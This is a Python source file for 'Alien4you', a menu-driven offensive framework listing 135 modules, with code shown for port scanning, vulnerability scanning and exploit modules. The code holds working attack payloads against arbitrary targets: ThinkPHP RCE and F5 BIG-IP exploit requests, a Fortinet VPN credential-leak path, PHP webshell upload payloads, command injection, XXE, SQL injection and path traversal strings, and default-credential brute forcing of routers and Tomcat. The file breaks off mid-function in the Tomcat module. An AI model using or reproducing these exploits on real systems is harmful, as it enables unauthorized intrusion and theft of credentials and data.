#!/usr/bin/env python3
import os
import sys
import subprocess
import socket
import re
import json
import time
import random
import requests
import nmap
import dns.resolver
import geoip2.database
import hashlib
import itertools
import threading
import queue
import signal
import urllib.parse
import base64
import zipfile
import tarfile
import xml.etree.ElementTree as ET
from scapy.all import *
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class Alien4you:
    def __init__(self):
        self.version = "1.0"
        self.author = "Alien4you Framework"
        self.banner = f"""
        █████╗ ██╗     ██╗███████╗███╗   ██╗██████╗ ██╗   ██╗
       ██╔══██╗██║     ██║██╔════╝████╗  ██║██╔══██╗╚██╗ ██╔╝
       ███████║██║     ██║█████╗  ██╔██╗ ██║██████╔╝ ╚████╔╝ 
       ██╔══██║██║     ██║██╔══╝  ██║╚██╗██║██╔══██╗  ╚██╔╝  
       ██║  ██║███████╗██║███████╗██║ ╚████║██████╔╝   ██║   
       ╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝    ╚═╝   
                    Advanced Penetration Testing Framework v{self.version}
        """
        self.modules = {
            "1": {"name": "Advanced Port Scanner", "func": self.port_scanner},
            "2": {"name": "Reverse DNS Lookup", "func": self.reverse_dns},
            "3": {"name": "GeoIP Lookup", "func": self.geoip_lookup},
            "4": {"name": "Advanced Hash Cracker", "func": self.hash_cracker},
            "5": {"name": "Subdomain Enumeration", "func": self.subdomain_enum},
            "6": {"name": "Whois Lookup", "func": self.whois_lookup},
            "7": {"name": "Traceroute", "func": self.traceroute},
            "8": {"name": "Vulnerability Scan", "func": self.vuln_scan},
            "9": {"name": "ThinkPHP RCE Exploit", "func": self.thinkphp_rce},
            "10": {"name": "F5 BIG-IP RCE Checker", "func": self.f5_bigip_rce},
            "11": {"name": "Fortinet SSL VPN Credential Leak", "func": self.fortinet_leak},
            "12": {"name": "Zimbra XSS & RCE Scanner", "func": self.zimbra_scan},
            "13": {"name": "File Upload Exploit Tester", "func": self.file_upload_test},
            "14": {"name": "Command Injection Auto-Tester", "func": self.command_injection},
            "15": {"name": "XXE Vulnerability Tester", "func": self.xxe_test},
            "16": {"name": "SQLi Detector", "func": self.sqli_detector},
            "17": {"name": "Path Traversal Scanner", "func": self.path_traversal},
            "18": {"name": "WordPress Plugin Vuln Scanner", "func": self.wp_plugin_scan},
            "19": {"name": "Router Exploit Scanner", "func": self.router_scan},
            "20": {"name": "Exposed .env File Detector", "func": self.env_detector},
            "21": {"name": "Open Jenkins Exploit Scanner", "func": self.jenkins_scan},
            "22": {"name": "Exposed Git Repository Finder", "func": self.git_finder},
            "23": {"name": "Tomcat Manager Exploit", "func": self.tomcat_exploit},
            "24": {"name": "Hidden Parameter Discovery", "func": self.hidden_params},
            "25": {"name": "JavaScript Secrets Finder", "func": self.js_secrets},
            "26": {"name": "GitHub Leak Keyword Scanner", "func": self.github_leak},
            "27": {"name": "Exposed Backup File Detector", "func": self.backup_detector},
            "28": {"name": "CSP Analyzer", "func": self.csp_analyzer},
            "29": {"name": "Email Spoofing Test", "func": self.email_spoofing},
            "30": {"name": "Open Database Finder", "func": self.open_db_finder},
            "31": {"name": "Google Analytics Tracker Matching", "func": self.ga_tracker},
            "32": {"name": "Login Page Brute Detector", "func": self.login_brute_detect},
            "33": {"name": "JWT None Algorithm Exploit Tester", "func": self.jwt_none_test},
            "34": {"name": "Username Enumerator", "func": self.username_enum},
            "35": {"name": "LinkedIn Employee Enumerator", "func": self.linkedin_enum},
            "36": {"name": "PDF/DOC Metadata Scraper", "func": self.metadata_scraper},
            "37": {"name": "Employee Email Pattern Generator", "func": self.email_pattern_gen},
            "38": {"name": "Email Permutation Generator", "func": self.email_permutation_gen},
            "39": {"name": "SSID Broadcast Sniffer", "func": self.ssid_sniffer},
            "40": {"name": "BSSID Tracker", "func": self.bssid_tracker},
            "41": {"name": "Wi-Fi Channel Analyzer", "func": self.wifi_channel_analyzer},
            "42": {"name": "Probe Request Sniffer", "func": self.probe_sniffer},
            "43": {"name": "Client-AP Association Mapper", "func": self.client_ap_mapper},
            "44": {"name": "EAP Network Detector", "func": self.eap_detector},
            "45": {"name": "WPS Network Finder", "func": self.wps_finder},
            "46": {"name": "Beacon Flood Detector", "func": self.beacon_flood_detect},
            "47": {"name": "PMKID Hash Dumper", "func": self.pmkid_dumper},
            "48": {"name": "WPA Handshake Capture Tool", "func": self.wpa_handshake},
            "49": {"name": "Hidden SSID Revealer", "func": self.hidden_ssid_revealer},
            "50": {"name": "Wi-Fi Vendor Fingerprinter", "func": self.wifi_vendor_fingerprint},
            "51": {"name": "RSSI Signal Strength Heatmap", "func": self.rssi_heatmap},
            "52": {"name": "Deauthentication Attack Module", "func": self.deauth_attack},
            "53": {"name": "Evil Twin Auto-Creator", "func": self.evil_twin},
            "54": {"name": "Karma Attack Simulation", "func": self.karma_attack},
            "55": {"name": "WPS Pixie Dust Attack Tool", "func": self.pixie_dust},
            "56": {"name": "Handshake Cracker", "func": self.handshake_cracker},
            "57": {"name": "Captive Portal Injection", "func": self.captive_portal},
            "58": {"name": "SSID Cloaking/Flooding Script", "func": self.ssid_flood},
            "59": {"name": "EAPOL Replay Attack Tool", "func": self.eapol_replay},
            "60": {"name": "MANA Attack Framework Wrapper", "func": self.mana_attack},
            "61": {"name": "WPA2 Enterprise MITM Toolkit", "func": self.wpa2_mitm},
            "62": {"name": "Automatic Hashcat Wrapper for PMKID", "func": self.hashcat_pmkid},
            "63": {"name": "Bluetooth Device Enumerator", "func": self.bt_enum},
            "64": {"name": "BLE Advertisement Sniffer", "func": self.ble_sniffer},
            "65": {"name": "BLE Service/Characteristic Dumper", "func": self.ble_service_dump},
            "66": {"name": "Bluetooth MAC Vendor Lookup", "func": self.bt_vendor_lookup},
            "67": {"name": "Bluetooth Pairing Sniffer", "func": self.bt_pairing_sniffer},
            "68": {"name": "BLE Spoof Detector", "func": self.ble_spoof_detect},
            "69": {"name": "Struts2 OGNL Injection Tester", "func": self.struts2_injection},
            "70": {"name": "Laravel Debug Mode Checker", "func": self.laravel_debug_check},
            "71": {"name": "Apache Solr RCE", "func": self.solr_rce},
            "72": {"name": "Spring4Shell Exploit", "func": self.spring4shell},
            "73": {"name": "Host Header Injection Tester", "func": self.host_header_injection},
            "74": {"name": "Open Redirect + Payload Checker", "func": self.open_redirect},
            "75": {"name": "CRLF Injection Scanner", "func": self.crlf_injection},
            "76": {"name": "SSTI Detection", "func": self.ssti_detection},
            "77": {"name": "JWT Brute Forcer", "func": self.jwt_brute},
            "78": {"name": "RFI/LFI Payload Tester", "func": self.rfi_lfi_test},
            "79": {"name": "Honeypot Detector", "func": self.honeypot_detect},
            "80": {"name": "Web Cache Poisoning Tester", "func": self.cache_poisoning},
            "81": {"name": "IP History Tracker", "func": self.ip_history},
            "82": {"name": "Favicon Hash Scanner", "func": self.favicon_hash},
            "83": {"name": "GitHub Token Scanner", "func": self.github_token_scan},
            "84": {"name": "Email Address Verifier", "func": self.email_verify},
            "85": {"name": "JS Source Map Parser", "func": self.js_sourcemap},
            "86": {"name": "Cloudflare Misconfig Scanner", "func": self.cf_misconfig},
            "87": {"name": "Password Reset Workflow Mapper", "func": self.pw_reset_workflow},
            "88": {"name": "Error Page Fuzzer", "func": self.error_fuzzer},
            "89": {"name": "Open Hotspot Detector", "func": self.open_hotspot},
            "90": {"name": "Wi-Fi Phishing Bait Auto-Broadcaster", "func": self.phishing_bait},
            "91": {"name": "BLE Impersonation Script", "func": self.ble_impersonation},
            "92": {"name": "Zigbee Device Scanner", "func": self.zigbee_scan},
            "93": {"name": "Wi-Fi Management Frame Analyzer", "func": self.wifi_frame_analyzer},
            "94": {"name": "Archived Robots.txt Viewer", "func": self.archived_robots},
            "95": {"name": "Phone Number Intelligence Tool", "func": self.phone_intel},
            "96": {"name": "Company Techstack Profiler", "func": self.techstack_profile},
            "97": {"name": "Employee Avatar Matcher", "func": self.avatar_matcher},
            "98": {"name": "Typosquat Domain Checker", "func": self.typosquat_check},
            "99": {"name": "Payload Encoder Suite", "func": self.payload_encoder},
            "100": {"name": "File Signature Analyzer", "func": self.file_signature},
            "101": {"name": "Portable SQLite DB Viewer/Editor", "func": self.sqlite_viewer},
            "102": {"name": "Custom Header Injector", "func": self.header_injector},
            "103": {"name": "Shellshock Exploit Tester", "func": self.shellshock_test},
            "104": {"name": "CVE Autoscanner", "func": self.cve_autoscan},
            "105": {"name": "Drupalgeddon2 Exploit", "func": self.drupalgeddon2},
            "106": {"name": "SSRF Tester", "func": self.ssrf_test},
            "107": {"name": "AWS Metadata Fetcher", "func": self.aws_metadata},
            "108": {"name": "Broken Auth Checker", "func": self.broken_auth},
            "109": {"name": "Authentication Logic Fuzzer", "func": self.auth_fuzzer},
            "110": {"name": "HTTP Method Tester", "func": self.http_method_test},
            "111": {"name": "Access-Control Bypass Checker", "func": self.cors_bypass},
            "112": {"name": "WebSocket Injection Tester", "func": self.websocket_inject},
            "113": {"name": "CORS Misconfig Finder", "func": self.cors_misconfig},
            "114": {"name": "API Endpoint Fuzzer", "func": self.api_fuzzer},
            "115": {"name": "Web Framework Detector", "func": self.web_framework},
            "116": {"name": "Virtual Host Enumerator", "func": self.vhost_enum},
            "117": {"name": "JS Dependency Analyzer", "func": self.js_dependency},
            "118": {"name": "Historical Subdomain Crawler", "func": self.historical_subdomains},
            "119": {"name": "Sitemap.xml + Robots.txt Extractor", "func": self.sitemap_extractor},
            "120": {"name": "WAF Fingerprinter", "func": self.waf_fingerprint},
            "121": {"name": "User-Agent Based Feature Toggle Detector", "func": self.ua_feature_detect},
            "122": {"name": "Shared Hosting Detector", "func": self.shared_hosting},
            "123": {"name": "CNAME Chain Resolver", "func": self.cname_chain},
            "124": {"name": "Common Admin Panel Finder", "func": self.admin_panel_finder},
            "125": {"name": "Port Knocking Detector", "func": self.port_knocking},
            "126": {"name": "IPv6 Asset Discovery Tool", "func": self.ipv6_discovery},
            "127": {"name": "Passive DNS Correlator", "func": self.passive_dns},
            "128": {"name": "DNSSEC Misconfig Scanner", "func": self.dnssec_scan},
            "129": {"name": "Load Balancer Fingerprinter", "func": self.load_balancer},
            "130": {"name": "TLS/SSL Cert Analyzer", "func": self.tls_analyzer},
            "131": {"name": "Pivoting Module", "func": self.pivoting_module},
            "132": {"name": "AV Bypass Techniques", "func": self.av_bypass},
            "133": {"name": "Post-Exploitation Kit", "func": self.post_exploit},
            "134": {"name": "WebShell Generator", "func": self.webshell_gen},
            "135": {"name": "Vulnerability Analysis", "func": self.vuln_analysis}
        }

    def display_menu(self):
        print(self.banner)
        print("Available Modules:")
        for key in sorted(self.modules.keys(), key=int):
            print(f"{key}. {self.modules[key]['name']}")
        print("\n0. Exit")

    def run(self):
        while True:
            self.display_menu()
            choice = input("\nSelect module (0-135): ")
            if choice == "0":
                print("Exiting Alien4you Framework...")
                break
            elif choice in self.modules:
                try:
                    self.modules[choice]['func']()
                except Exception as e:
                    print(f"Error executing module: {e}")
            else:
                print("Invalid selection. Try again.")

    def port_scanner(self):
        target = input("Enter target IP/hostname: ")
        ports = input("Enter port range (e.g. 1-1000): ")
        nm = nmap.PortScanner()
        print(f"Scanning {target} ports {ports}...")
        nm.scan(target, ports)
        for host in nm.all_hosts():
            print(f"\nHost: {host} ({nm[host].hostname()})")
            print(f"State: {nm[host].state()}")
            for proto in nm[host].all_protocols():
                print(f"\nProtocol: {proto}")
                ports = nm[host][proto].keys()
                for port in sorted(ports):
                    print(f"Port: {port}\tState: {nm[host][proto][port]['state']}\tService: {nm[host][proto][port]['name']}")

    def reverse_dns(self):
        ip = input("Enter IP address: ")
        try:
            hostname = socket.gethostbyaddr(ip)
            print(f"Reverse DNS for {ip}: {hostname[0]}")
        except socket.herror:
            print(f"No reverse DNS found for {ip}")

    def geoip_lookup(self):
        ip = input("Enter IP address: ")
        try:
            reader = geoip2.database.Reader('GeoLite2-City.mmdb')
            response = reader.city(ip)
            print(f"\nGeoIP Data for {ip}:")
            print(f"Country: {response.country.name}")
            print(f"City: {response.city.name}")
            print(f"Postal Code: {response.postal.code}")
            print(f"Coordinates: {response.location.latitude}, {response.location.longitude}")
            print(f"Time Zone: {response.location.time_zone}")
        except Exception as e:
            print(f"Error: {e}. Make sure GeoLite2-City.mmdb is in the same directory.")

    def hash_cracker(self):
        hash_value = input("Enter hash to crack: ")
        hash_type = input("Enter hash type (md5, sha1, sha256, etc): ")
        wordlist = input("Enter path to wordlist: ")
        
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                words = f.read().splitlines()
            
            print(f"Cracking {hash_type} hash {hash_value}...")
            
            for word in words:
                if hash_type.lower() == 'md5':
                    hashed_word = hashlib.md5(word.encode()).hexdigest()
                elif hash_type.lower() == 'sha1':
                    hashed_word = hashlib.sha1(word.encode()).hexdigest()
                elif hash_type.lower() == 'sha256':
                    hashed_word = hashlib.sha256(word.encode()).hexdigest()
                else:
                    print("Unsupported hash type")
                    return
                
                if hashed_word == hash_value:
                    print(f"\n[+] Hash cracked: {word}")
                    return
            
            print("\n[-] Hash not found in wordlist")
        except Exception as e:
            print(f"Error: {e}")

    def subdomain_enum(self):
        domain = input("Enter domain (e.g. example.com): ")
        wordlist = input("Enter path to subdomain wordlist (or press enter for default): ")
        
        if not wordlist:
            wordlist = "subdomains.txt"
            default_subs = ["www", "mail", "ftp", "admin", "test", "dev", "staging", "api", "blog", "shop"]
            with open(wordlist, 'w') as f:
                f.write("\n".join(default_subs))
        
        try:
            with open(wordlist, 'r') as f:
                subdomains = f.read().splitlines()
            
            print(f"Enumerating subdomains for {domain}...\n")
            
            def check_sub(sub):
                try:
                    ip = socket.gethostbyname(f"{sub}.{domain}")
                    print(f"[+] Found: {sub}.{domain} -> {ip}")
                except socket.gaierror:
                    pass
            
            with ThreadPoolExecutor(max_workers=20) as executor:
                executor.map(check_sub, subdomains)
        except Exception as e:
            print(f"Error: {e}")

    def whois_lookup(self):
        domain = input("Enter domain: ")
        try:
            result = subprocess.run(['whois', domain], capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error: {e}")

    def traceroute(self):
        target = input("Enter target host: ")
        try:
            result = subprocess.run(['traceroute', target], capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error: {e}")

    def vuln_scan(self):
        target = input("Enter target URL/IP: ")
        print(f"Running vulnerability scan on {target}...")
        try:
            nm = nmap.PortScanner()
            nm.scan(target, arguments='-sV --script=vulners')
            for host in nm.all_hosts():
                print(f"\nHost: {host} ({nm[host].hostname()})")
                print(f"State: {nm[host].state()}")
                for proto in nm[host].all_protocols():
                    print(f"\nProtocol: {proto}")
                    ports = nm[host][proto].keys()
                    for port in sorted(ports):
                        print(f"Port: {port}\tState: {nm[host][proto][port]['state']}")
                        if 'script' in nm[host][proto][port]:
                            for script in nm[host][proto][port]['script']:
                                print(f"  {script}: {nm[host][proto][port]['script'][script]}")
        except Exception as e:
            print(f"Error: {e}")

    def thinkphp_rce(self):
        url = input("Enter target URL (e.g. http://example.com): ")
        try:
            payload = "/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
            response = requests.get(url + payload, timeout=10)
            if "PHP Version" in response.text:
                print("[+] Vulnerable to ThinkPHP RCE (CVE-2018-20062)")
                print("Exploit successful - phpinfo() output found")
            else:
                print("[-] Target does not appear vulnerable")
        except Exception as e:
            print(f"Error: {e}")

    def f5_bigip_rce(self):
        url = input("Enter target URL (e.g. https://example.com): ")
        try:
            vuln_paths = [
                "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
                "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin"
            ]
            
            for path in vuln_paths:
                response = requests.get(url + path, verify=False, timeout=10)
                if "root:" in response.text or "admin" in response.text.lower():
                    print(f"[+] Vulnerable to F5 BIG-IP RCE (CVE-2020-5902)")
                    print(f"Exploit successful via {path}")
                    print(response.text[:500] + "...")
                    return
            
            print("[-] Target does not appear vulnerable")
        except Exception as e:
            print(f"Error: {e}")

    def fortinet_leak(self):
        url = input("Enter target Fortinet SSL VPN URL (e.g. https://vpn.example.com): ")
        try:
            vuln_path = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
            response = requests.get(url + vuln_path, verify=False, timeout=10)
            
            if "var fgt_lang =" in response.text:
                print("[+] Vulnerable to Fortinet SSL VPN Credential Leak (CVE-2018-13379)")
                print("Credentials may be present in response:")
                print(response.text[:500] + "...")
            else:
                print("[-] Target does not appear vulnerable")
        except Exception as e:
            print(f"Error: {e}")

    def zimbra_scan(self):
        url = input("Enter target Zimbra URL (e.g. https://mail.example.com): ")
        try:
            vuln_path = "/zimbraAdmin/soap/AccountRequest?mailto=admin@example.com"
            response = requests.post(url + vuln_path, data="<xml>test</xml>", timeout=10)
            
            if "ServiceException" in response.text and "AccountService" in response.text:
                print("[+] Potential Zimbra vulnerability detected (CVE-2022-37042)")
                print("Further manual verification required")
            else:
                print("[-] Target does not appear vulnerable to tested Zimbra exploits")
        except Exception as e:
            print(f"Error: {e}")

    def file_upload_test(self):
        url = input("Enter target URL with upload functionality: ")
        extensions = ['php', 'php2', 'php3', 'php4', 'php5', 'phtml', 'htaccess', 'phar', 'inc']
        payloads = [
            '<?php echo shell_exec($_GET["cmd"]); ?>',
            '<?php system($_GET["cmd"]); ?>',
            'GIF89a;<?php system($_GET["cmd"]); ?>'
        ]
        
        print("Testing file upload vulnerabilities...")
        
        for ext in extensions:
            for payload in payloads:
                files = {'file': ('test.' + ext, payload)}
                try:
                    response = requests.post(url, files=files, timeout=10)
                    if response.status_code == 200:
                        print(f"Attempted upload with extension .{ext}")
                        print(f"Response code: {response.status_code}")
                        print("Check manually if file was uploaded successfully")
                except Exception as e:
                    print(f"Error testing .{ext}: {e}")

    def command_injection(self):
        url = input("Enter target URL with parameters to test: ")
        params = input("Enter parameters to test (comma separated): ").split(',')
        payloads = [
            ';id',
            '|id',
            '`id`',
            '$(id)',
            '|| id',
            '&& id',
            '; sleep 5',
            '| sleep 5',
            '`sleep 5`',
            '$(sleep 5)'
        ]
        
        print("Testing for command injection...")
        
        for param in params:
            for payload in payloads:
                try:
                    test_url = f"{url}?{param.strip()}=test{payload}"
                    start_time = time.time()
                    response = requests.get(test_url, timeout=10)
                    elapsed = time.time() - start_time
                    
                    if "uid=" in response.text or "gid=" in response.text:
                        print(f"[+] Possible command injection in GET parameter {param}")
                        print(f"Payload: {payload}")
                        print(f"Response: {response.text[:200]}...")
                    elif payload.startswith('sleep') and elapsed >= 5:
                        print(f"[+] Possible blind command injection (time-based) in GET parameter {param}")
                        print(f"Payload: {payload}")
                    
                    data = {param.strip(): f"test{payload}"}
                    start_time = time.time()
                    response = requests.post(url, data=data, timeout=10)
                    elapsed = time.time() - start_time
                    
                    if "uid=" in response.text or "gid=" in response.text:
                        print(f"[+] Possible command injection in POST parameter {param}")
                        print(f"Payload: {payload}")
                        print(f"Response: {response.text[:200]}...")
                    elif payload.startswith('sleep') and elapsed >= 5:
                        print(f"[+] Possible blind command injection (time-based) in POST parameter {param}")
                        print(f"Payload: {payload}")
                
                except Exception as e:
                    print(f"Error testing {param}: {e}")

    def xxe_test(self):
        url = input("Enter target URL to test for XXE: ")
        payloads = [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><foo>&xxe;</foo>'
        ]
        
        headers = {'Content-Type': 'application/xml'}
        
        print("Testing for XXE vulnerabilities...")
        
        for payload in payloads:
            try:
                response = requests.post(url, data=payload, headers=headers, timeout=10)
                if "root:" in response.text or "[extensions]" in response.text:
                    print("[+] Possible XXE vulnerability detected")
                    print("Response contains file contents:")
                    print(response.text[:500] + "...")
                    return
            except Exception as e:
                print(f"Error testing XXE: {e}")
        
        print("[-] No obvious XXE vulnerabilities detected")

    def sqli_detector(self):
        url = input("Enter target URL with parameters to test: ")
        params = input("Enter parameters to test (comma separated): ").split(',')
        
        union_payloads = [
            "' UNION SELECT 1,2,3-- -",
            "' UNION SELECT null,@@version,null-- -",
            "' UNION SELECT null,table_name,null FROM information_schema.tables-- -"
        ]
        
        error_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1'-- -",
            "\" OR \"1\"=\"1",
            "\" OR \"1\"=\"1\"-- -"
        ]
        
        time_payloads = [
            "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 AND sleep(5)-- -",
            "\" OR (SELECT COUNT(*) FROM information_schema.tables) > 0 AND sleep(5)-- -"
        ]
        
        print("Testing for SQL injection vulnerabilities...")
        
        for param in params:
            param = param.strip()
            
            for payload in error_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = requests.get(test_url, timeout=10)
                    
                    if "SQL syntax" in response.text or "MySQL" in response.text or "ORA-" in response.text:
                        print(f"[+] Possible error-based SQLi in GET parameter {param}")
                        print(f"Payload: {payload}")
                        print(f"Error: {response.text[:200]}...")
                        return
                    
                    data = {param: payload}
                    response = requests.post(url, data=data, timeout=10)
                    
                    if "SQL syntax" in response.text or "MySQL" in response.text or "ORA-" in response.text:
                        print(f"[+] Possible error-based SQLi in POST parameter {param}")
                        print(f"Payload: {payload}")
                        print(f"Error: {response.text[:200]}...")
                        return
                
                except Exception as e:
                    print(f"Error testing {param}: {e}")
            
            for payload in union_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = requests.get(test_url, timeout=10)
                    
                    if "1 2 3" in response.text or "@@version" in response.text or "information_schema" in response.text:
                        print(f"[+] Possible union-based SQLi in GET parameter {param}")
                        print(f"Payload: {payload}")
                        print(f"Response: {response.text[:200]}...")
                        return
                    
                    data = {param: payload}
                    response = requests.post(url, data=data, timeout=10)
                    
                    if "1 2 3" in response.text or "@@version" in response.text or "information_schema" in response.text:
                        print(f"[+] Possible union-based SQLi in POST parameter {param}")
                        print(f"Payload: {payload}")
                        print(f"Response: {response.text[:200]}...")
                        return
                
                except Exception as e:
                    print(f"Error testing {param}: {e}")
            
            for payload in time_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    start_time = time.time()
                    response = requests.get(test_url, timeout=15)
                    elapsed = time.time() - start_time
                    
                    if elapsed >= 5:
                        print(f"[+] Possible time-based blind SQLi in GET parameter {param}")
                        print(f"Payload: {payload}")
                        print(f"Response time: {elapsed} seconds")
                        return
                    
                    data = {param: payload}
                    start_time = time.time()
                    response = requests.post(url, data=data, timeout=15)
                    elapsed = time.time() - start_time
                    
                    if elapsed >= 5:
                        print(f"[+] Possible time-based blind SQLi in POST parameter {param}")
                        print(f"Payload: {payload}")
                        print(f"Response time: {elapsed} seconds")
                        return
                
                except Exception as e:
                    print(f"Error testing {param}: {e}")
        
        print("[-] No obvious SQL injection vulnerabilities detected")

    def path_traversal(self):
        url = input("Enter target URL with parameter to test (e.g. http://example.com/file.php?path=): ")
        param = input("Enter parameter name to test: ")
        
        payloads = [
            "../../../../../../../../etc/passwd",
            "../../../../../../../../etc/hosts",
            "../../../../../../../../windows/win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
        ]
        
        print("Testing for path traversal vulnerabilities...")
        
        for payload in payloads:
            try:
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=10)
                
                if "root:" in response.text or "[extensions]" in response.text:
                    print("[+] Possible path traversal vulnerability detected")
                    print(f"Payload: {payload}")
                    print("File contents:")
                    print(response.text[:500] + "...")
                    return
            except Exception as e:
                print(f"Error testing path traversal: {e}")
        
        print("[-] No obvious path traversal vulnerabilities detected")

    def wp_plugin_scan(self):
        url = input("Enter WordPress site URL: ")
        try:
            response = requests.get(f"{url}/wp-content/plugins/", timeout=10)
            if response.status_code == 200:
                print("[+] Found plugins directory listing enabled")
                print("Manually check for outdated plugins in the listing")
            else:
                print("[-] Plugins directory listing not enabled")
            
            common_plugins = [
                'akismet', 'contact-form-7', 'woocommerce', 'yoast-seo',
                'jetpack', 'elementor', 'all-in-one-seo-pack'
            ]
            
            print("\nChecking common plugins for version info...")
            for plugin in common_plugins:
                try:
                    response = requests.get(f"{url}/wp-content/plugins/{plugin}/readme.txt", timeout=5)
                    if response.status_code == 200:
                        version_match = re.search(r'Stable tag:\s*([0-9.]+)', response.text)
                        if version_match:
                            version = version_match.group(1)
                            print(f"Found {plugin} version {version}")
                except:
                    pass
            
            print("\nNote: For comprehensive scanning, use dedicated WordPress vulnerability scanners like WPScan")
        except Exception as e:
            print(f"Error: {e}")

    def router_scan(self):
        ip = input("Enter router IP address: ")
        common_ports = [80, 443, 8080, 8443]
        common_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '1234'),
            ('user', 'user'),
            ('root', 'root'),
            ('admin', '')
        ]
        
        print(f"Scanning router at {ip}...")
        
        open_ports = []
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        
        if not open_ports:
            print("[-] No common router ports open")
            return
        
        print(f"[+] Open ports found: {', '.join(map(str, open_ports))}")
        
        for port in open_ports:
            if port in [80, 443, 8080, 8443]:
                url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}"
                if port == 8443:
                    url = f"https://{ip}:8443"
                
                print(f"\nChecking web interface at {url}")
                
                try:
                    response = requests.get(url, timeout=5)
                    if any(x in response.text.lower() for x in ['router', 'login', 'admin', 'password']):
                        print("[+] Found router login page")
                        
                        login_url = url
                        if 'action' in response.text.lower():
                            soup = BeautifulSoup(response.text, 'html.parser')
                            forms = soup.find_all('form')
                            if forms:
                                form_action = forms[0].get('action', '')
                                if form_action.startswith('http'):
                                    login_url = form_action
                                elif form_action.startswith('/'):
                                    login_url = url + form_action
                                else:
                                    login_url = url + '/' + form_action
                        
                        for username, password in common_creds:
                            try:
                                data = {}
                                if 'name="username"' in response.text.lower():
                                    data['username'] = username
                                elif 'name="user"' in response.text.lower():
                                    data['user'] = username
                                elif 'name="email"' in response.text.lower():
                                    data['email'] = username
                                
                                if 'name="password"' in response.text.lower():
                                    data['password'] = password
                                elif 'name="pass"' in response.text.lower():
                                    data['pass'] = password
                                
                                if data:
                                    login_response = requests.post(login_url, data=data, timeout=5)
                                    if 'logout' in login_response.text.lower() or 'welcome' in login_response.text.lower():
                                        print(f"[+] Default credentials work: {username}/{password}")
                                        return
                            except:
                                pass
                        
                        print("[-] No default credentials worked")
                except Exception as e:
                    print(f"Error checking web interface: {e}")

    def env_detector(self):
        url = input("Enter target URL: ")
        paths = [
            '/.env',
            '/app/.env',
            '/config/.env',
            '/laravel/.env',
            '/symfony/.env',
            '/backend/.env'
        ]
        
        print("Checking for exposed .env files...")
        
        for path in paths:
            try:
                response = requests.get(url + path, timeout=5)
                if response.status_code == 200 and ('APP_KEY' in response.text or 'DB_PASSWORD' in response.text):
                    print(f"[+] Found exposed .env file at {path}")
                    print("Potential secrets found:")
                    print(response.text[:500] + "...")
                    return
            except Exception as e:
                print(f"Error checking {path}: {e}")
        
        print("[-] No exposed .env files found")

    def jenkins_scan(self):
        url = input("Enter Jenkins URL (e.g. http://example.com:8080): ")
        paths = [
            '/script',
            '/manage',
            '/asynchPeople/',
            '/securityRealm/'
        ]
        
        print("Checking for open Jenkins instances...")
        
        try:
            response = requests.get(url, timeout=5)
            if 'Jenkins' in response.text:
                print("[+] Jenkins instance found")
                
                if 'login' not in response.text.lower():
                    print("[!] Jenkins appears to have no authentication")
                
                script_response = requests.get(url + '/script', timeout=5)
                if 'Script Console' in script_response.text:
                    print("[+] Jenkins script console accessible (potential RCE)")
                
                for path in paths:
                    try:
                        path_response = requests.get(url + path, timeout=5)
                        if path_response.status_code == 200:
                            print(f"[+] Accessible path found: {path}")
                    except:
                        pass
            else:
                print("[-] Not a Jenkins instance")
        except Exception as e:
            print(f"Error: {e}")

    def git_finder(self):
        url = input("Enter target URL: ")
        paths = [
            '/.git/HEAD',
            '/.git/config',
            '/.git/index',
            '/.git/logs/HEAD'
        ]
        
        print("Checking for exposed .git directories...")
        
        for path in paths:
            try:
                response = requests.get(url + path, timeout=5)
                if response.status_code == 200 and ('ref:' in response.text or '[core]' in response.text):
                    print(f"[+] Found exposed .git file at {path}")
                    print("Contents:")
                    print(response.text)
                    
                    if path == '/.git/HEAD':
                        print("\nAttempting to download entire .git directory...")
                        try:
                            subprocess.run(['git-dumper', url, 'git_dump'], check=True)
                            print("[+] Git repository dumped to git_dump directory")
                        except:
                            print("[-] git-dumper tool not found or failed")
                    
                    return
            except Exception as e:
                print(f"Error checking {path}: {e}")
        
        print("[-] No exposed .git directories found")

    def tomcat_exploit(self):
        url = input("Enter Tomcat Manager URL (e.g. http://example.com:8080/manager/html): ")
        creds = [
            ('tomcat', 'tomcat'),
            ('admin', 'admin'),
            ('manager', 'manager'),
            ('tomcat', 's3cret'),
            ('admin', 'password')
        ]
        
        print("Checking Tomcat Manager for vulnerabilities...")
        
        try:
            response = requests.get(url, timeout=5)
            if 'Tomcat Web Application Manager' in response.text:
                print("[+] Tomcat Manager found")
                
                if 'Applications' in response.text:
                    print("[!] Tomcat Manager appears to have no authentication")
                    print("Try uploading WAR file manually")
                    return
                
                for username, password in creds:
                    try:
                        auth_response = requests.get(url, auth=(username, password), timeout=5)
